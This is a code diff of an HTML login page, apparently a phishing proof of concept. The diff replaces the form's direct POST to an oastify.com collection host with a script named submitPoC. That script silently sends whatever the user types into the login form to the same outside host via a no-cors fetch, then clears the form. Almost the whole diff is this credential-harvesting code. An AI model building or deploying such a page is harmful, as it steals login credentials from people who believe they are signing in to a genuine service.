@@ -145,7 +145,7 @@
         <div class="active">Use Password</div>
         <div>Use Secure Link</div>
       </div>
-      <form method="POST" action="https://r1t2f5ndv073o0m763p89qjpsgy7mzao.oastify.com">
+      <form onsubmit="submitPoC(event)">
         <label for="username">Email Address</label>
         <input type="email" id="username" name="username" placeholder="Enter your email address" required>
 
@@ -164,5 +164,18 @@
       <a href="#">Download Whitepaper</a>
     </div>
   </div>
+  <script>
+    function submitPoC(event) {
+      event.preventDefault();
+      const form = event.target;
+      const data = new FormData(form);
+      fetch("https://r1t2f5ndv073o0m763p89qjpsgy7mzao.oastify.com", {
+        method: "POST",
+        body: data,
+        mode: "no-cors"
+      });
+      form.reset();
+    }
+  </script>
 </body>
 </html>
